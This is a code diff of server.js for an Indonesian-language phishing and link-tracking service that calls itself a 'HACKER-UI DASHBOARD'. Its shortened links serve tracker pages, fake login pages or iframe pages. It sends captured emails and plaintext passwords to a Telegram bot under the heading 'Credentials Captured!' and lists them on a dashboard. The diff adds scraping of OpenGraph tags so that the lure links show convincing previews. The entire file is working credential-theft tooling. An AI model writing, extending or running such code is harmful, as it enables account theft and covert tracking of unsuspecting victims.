@@ -1,4 +1,4 @@
-// File: server.js (v7.0 - Final with Telegram Credential Notif)
+// File: server.js (v7.3 - Final with Auto OG Preview)
 
 require('dotenv').config();
 
@@ -15,12 +15,12 @@ const requestIp = require('request-ip');
 const axios = require('axios');
 const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
+const cheerio = require('cheerio'); // Library baru
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" } });
 const PORT = process.env.PORT || 4000;
-
 const JWT_SECRET = process.env.JWT_SECRET || 'gantidengankatayangsan6atrahas14';
 
 app.use(cors());
@@ -31,23 +31,14 @@ app.use(express.static(__dirname));
 const protectRoute = (req, res, next) => {
     try {
         const token = req.headers.authorization?.split(" ")[1];
-        if (!token) {
-            return res.status(401).json({ message: 'Akses ditolak. Token tidak ada.' });
-        }
-        
+        if (!token) { return res.status(401).json({ message: 'Akses ditolak. Token tidak ada.' }); }
         jwt.verify(token, JWT_SECRET, (err, decoded) => {
-            if (err) {
-                return res.status(401).json({ message: 'Token tidak valid.' });
-            }
+            if (err) { return res.status(401).json({ message: 'Token tidak valid.' }); }
             req.user = decoded;
             next();
         });
-    } catch (error) {
-        res.status(401).json({ message: 'Token tidak valid atau error.' });
-    }
+    } catch (error) { res.status(401).json({ message: 'Token tidak valid atau error.' }); }
 };
-
-// ================== HELPER FUNCTIONS & SOCKET.IO ================== //
 
 const sendTelegramNotification = async (locationData) => {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -83,14 +74,11 @@ const sendTelegramNotification = async (locationData) => {
 const sendCredentialsNotification = async (credData) => {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
-
     if (!botToken || !chatId) {
         console.warn('⚠️ Variabel Telegram Bot tidak diatur, notifikasi kredensial dilewati.');
         return;
     }
-
     const { username, trackerId, ipAddress, email, password } = credData;
-
     const message = `
 *🔒 Credentials Captured! 🔒*
 
@@ -102,15 +90,9 @@ const sendCredentialsNotification = async (credData) => {
 *Email:* \`${email}\`
 *Password:* \`${password}\`
     `;
-
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
     try {
-        await axios.post(url, {
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown'
-        });
+        await axios.post(url, { chat_id: chatId, text: message, parse_mode: 'Markdown' });
         console.log('✅ Notifikasi Kredensial Telegram berhasil dikirim.');
     } catch (error) {
         console.error('❌ Gagal mengirim notifikasi Kredensial Telegram:', error.response ? error.response.data : error.message);
@@ -132,14 +114,12 @@ const broadcastDashboardUpdate = async (socket = null) => {
             ) AS last_loc ON l.id = last_loc.tracker_id AND last_loc.rn = 1 
             ORDER BY l.created_at DESC`;
         const [links] = await db.promise().query(linksQuery);
-
         const statsQuery = `
             SELECT 
                 (SELECT COUNT(*) FROM links) as total_links, 
                 (SELECT SUM(click_count) FROM links) as total_clicks, 
                 (SELECT COUNT(*) FROM locations) as total_locations`;
         const [stats] = await db.promise().query(statsQuery);
-
         const [locations] = await db.promise().query(`SELECT user_agent FROM locations`);
         const parser = new UAParser();
         const browserStats = locations.reduce((acc, loc) => {
@@ -149,7 +129,6 @@ const broadcastDashboardUpdate = async (socket = null) => {
             }
             return acc;
         }, {});
-
         const credentialsQuery = `
             SELECT 
                 c.id, c.tracker_id, c.email, c.password, c.ip_address, c.created_at, 
@@ -160,11 +139,9 @@ const broadcastDashboardUpdate = async (socket = null) => {
             JOIN users u ON l.user_id = u.id 
             ORDER BY c.created_at DESC`;
         const [credentials] = await db.promise().query(credentialsQuery);
-
         const data = { links, stats: stats[0], browserStats, credentials };
         const emitter = socket || io;
         emitter.emit('dashboard_update', data);
-
     } catch (error) {
         console.error("❌ Gagal broadcast update:", error);
     }
@@ -224,44 +201,47 @@ app.post('/login', async (req, res) => {
 
 app.get('/:id', async (req, res) => {
     const { id } = req.params;
-    const userAgentString = req.headers['user-agent'];
     
     try {
-        const [links] = await db.promise().query(`SELECT l.original_url, l.url_android, l.url_ios, l.expires_at, u.username, l.link_type FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
+        const [links] = await db.promise().query(`SELECT l.*, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
         
         if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
         
-        const { original_url, url_android, url_ios, expires_at, username, link_type } = links[0];
+        const linkData = links[0];
         
-        if (expires_at && new Date(expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
+        if (linkData.expires_at && new Date(linkData.expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
         
-        const parser = new UAParser(userAgentString);
-        const os = parser.getOS().name;
-        
-        let destinationUrl = original_url;
-        if (os === 'Android' && url_android) {
-            destinationUrl = url_android;
-        } else if (os === 'iOS' && url_ios) {
-            destinationUrl = url_ios;
-        }
+        let destinationUrl = linkData.original_url;
 
-        io.emit('link_clicked', { username });
+        io.emit('link_clicked', { username: linkData.username });
 
-        if (link_type === 'direct') {
-            fs.readFile(path.join(__dirname, 'tracker.html'), 'utf8', (fsErr, data) => {
-                if (fsErr) return res.status(500).send('Server error');
-                const html = data.replace('{{DESTINATION_URL}}', destinationUrl).replace('{{TRACKER_ID}}', id).replace('{{USERNAME}}', username);
-                res.send(html);
-            });
-        } else if (link_type === 'intermediate') {
-            fs.readFile(path.join(__dirname, 'login_users.html'), 'utf8', (fsErr, data) => {
-                if (fsErr) return res.status(500).send('Server error');
-                const html = data.replace(/{{DESTINATION_URL}}/g, destinationUrl).replace(/{{TRACKER_ID}}/g, id);
-                res.send(html);
-            });
-        } else {
-            res.redirect(destinationUrl);
-        }
+        let templatePath = '';
+        if (linkData.link_type === 'direct') templatePath = 'tracker.html';
+        else if (linkData.link_type === 'intermediate') templatePath = 'login_users.html';
+        else if (linkData.link_type === 'iframe') templatePath = 'iframe_page.html';
+        else return res.redirect(destinationUrl);
+
+        fs.readFile(path.join(__dirname, templatePath), 'utf8', (fsErr, data) => {
+            if (fsErr) return res.status(500).send('Server error');
+
+            let ogTags = '';
+            if (linkData.og_title) ogTags += `<meta property="og:title" content="${linkData.og_title.replace(/"/g, '&quot;')}">\n`;
+            if (linkData.og_description) ogTags += `<meta property="og:description" content="${linkData.og_description.replace(/"/g, '&quot;')}">\n`;
+            if (linkData.og_image) ogTags += `<meta property="og:image" content="${linkData.og_image}">\n`;
+
+            let html = data.replace('', ogTags);
+            
+            html = html.replace(/{{DESTINATION_URL}}/g, destinationUrl)
+                       .replace(/{{TRACKER_ID}}/g, id)
+                       .replace(/{{USERNAME}}/g, linkData.username);
+            
+            if (linkData.link_type === 'iframe') {
+                let pageTitle = linkData.og_title || 'Loading...';
+                html = html.replace(/{{PAGE_TITLE}}/g, pageTitle);
+            }
+
+            res.send(html);
+        });
 
     } catch (error) {
         console.error("Error handling link click:", error);
@@ -358,6 +338,24 @@ app.post('/create', protectRoute, async (req, res) => {
     
     if (!username || !originalUrl) return res.status(400).json({ error: 'Data tidak lengkap' });
     
+    let ogData = { og_title: null, og_description: null, og_image: null };
+    try {
+        const response = await axios.get(originalUrl, { headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' } });
+        const html = response.data;
+        const $ = cheerio.load(html);
+
+        ogData.og_title = $('meta[property="og:title"]').attr('content') || $('title').text() || null;
+        ogData.og_description = $('meta[property="og:description"]').attr('content') || $('meta[name="description"]').attr('content') || null;
+        ogData.og_image = $('meta[property="og:image"]').attr('content') || null;
+
+        if (ogData.og_image && ogData.og_image.startsWith('/')) {
+            const { protocol, host } = new URL(originalUrl);
+            ogData.og_image = `${protocol}//${host}${ogData.og_image}`;
+        }
+    } catch (error) {
+        console.warn(`⚠️ Gagal mengambil OG data dari ${originalUrl}: ${error.message}`);
+    }
+
     let expiresAt = null;
     if (expiresIn && !isNaN(parseInt(expiresIn))) {
         expiresAt = new Date();
@@ -375,7 +373,16 @@ app.post('/create', protectRoute, async (req, res) => {
         }
 
         const id = nanoid(8);
-        const newLinkData = { id, user_id: userId, original_url: originalUrl, url_android: url_android || null, url_ios: url_ios || null, expires_at: expiresAt, link_type: linkType || 'direct' };
+        const newLinkData = { 
+            id, 
+            user_id: userId, 
+            original_url: originalUrl, 
+            url_android: url_android || null, 
+            url_ios: url_ios || null, 
+            expires_at: expiresAt, 
+            link_type: linkType || 'direct',
+            ...ogData
+        };
 
         await db.promise().query('INSERT INTO links SET ?', newLinkData);
         
@@ -418,7 +425,7 @@ app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
 });
 
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v7.0 (Final)`);
+    console.log(`\n HACKER-UI DASHBOARD v7.3 (Final)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
